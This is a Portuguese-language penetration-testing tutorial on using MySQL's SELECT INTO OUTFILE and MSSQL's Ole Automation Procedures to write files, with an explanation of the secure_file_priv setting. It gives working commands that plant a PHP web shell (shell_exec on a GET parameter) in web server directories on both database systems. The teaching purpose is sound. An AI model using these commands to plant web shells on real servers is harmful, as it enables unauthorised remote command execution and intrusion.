# Gravar arquivos locais

`MySQL` não possui um procedimento armazenado como `xp_cmdshell`, mas podemos conseguir a execução do comando se escrevermos em um local no sistema de arquivos que possa executar nossos comandos. Por exemplo, suponha que `MySQL` opere em um servidor web baseado em PHP ou em outras linguagens de programação como ASP.NET. Se tivermos os privilégios apropriados, podemos tentar escrever um arquivo usando [SELECT INTO OUTFILE](https://mariadb.com/kb/en/select-into-outfile/) no diretório do servidor web. Então podemos navegar até o local onde o arquivo está e executar nossos comandos.

## MySQL - Gravar arquivo local

```shell
mysql> SELECT "<?php echo shell_exec($_GET['c']);?>" INTO OUTFILE '/var/www/html/webshell.php';

Query OK, 1 row affected (0.001 sec)
```

Em `MySQL`, uma variável de sistema global [secure_file_priv](https://dev.mysql.com/doc/refman/5.7/en/server-system-variables.html#sysvar_secure_file_priv) limita o efeito das operações de importação e exportação de dados, como aquelas executadas pelas instruções `LOAD DATA` e `SELECT … INTO OUTFILE`e pela função [LOAD_FILE()](https://dev.mysql.com/doc/refman/5.7/en/string-functions.html#function_load-file) . Essas operações são permitidas apenas para usuários que possuem o privilégio [FILE .](https://dev.mysql.com/doc/refman/5.7/en/privileges-provided.html#priv_file)

`secure_file_priv` pode ser definido da seguinte forma:

- Se estiver vazia, a variável não terá efeito, o que não é uma configuração segura.
- Se definido como o nome de um diretório, o servidor limita as operações de importação e exportação para funcionar apenas com arquivos nesse diretório. O diretório deve existir; o servidor não o cria.
- Se definido como NULL, o servidor desabilita as operações de importação e exportação.

No exemplo a seguir, podemos ver que a variável `secure_file_priv` está vazia, o que significa que podemos ler e escrever dados usando `MySQL`:

## MySQL - privilégios de arquivo seguros

```shell
mysql> show variables like "secure_file_priv";

+------------------+-------+
| Variable_name    | Value |
+------------------+-------+
| secure_file_priv |       |
+------------------+-------+

1 row in set (0.005 sec)
```

Para gravar arquivos usando `MSSQL`, precisamos habilitar [Ole Automation Procedures](https://docs.microsoft.com/en-us/sql/database-engine/configure-windows/ole-automation-procedures-server-configuration-option) , que requer privilégios de administrador, e então executar alguns procedimentos armazenados para criar o arquivo:

## MSSQL - Habilitar procedimentos de automação Ole

```shell
1> sp_configure 'show advanced options', 1
2> GO
3> RECONFIGURE
4> GO
5> sp_configure 'Ole Automation Procedures', 1
6> GO
7> RECONFIGURE
8> GO
```

## MSSQL - Criar um arquivo

```shell
1> DECLARE @OLE INT
2> DECLARE @FileID INT
3> EXECUTE sp_OACreate 'Scripting.FileSystemObject', @OLE OUT
4> EXECUTE sp_OAMethod @OLE, 'OpenTextFile', @FileID OUT, 'c:\inetpub\wwwroot\webshell.php', 8, 1
5> EXECUTE sp_OAMethod @FileID, 'WriteLine', Null, '<?php echo shell_exec($_GET["c"]);?>'
6> EXECUTE sp_OADestroy @FileID
7> EXECUTE sp_OADestroy @OLE
8> GO
```

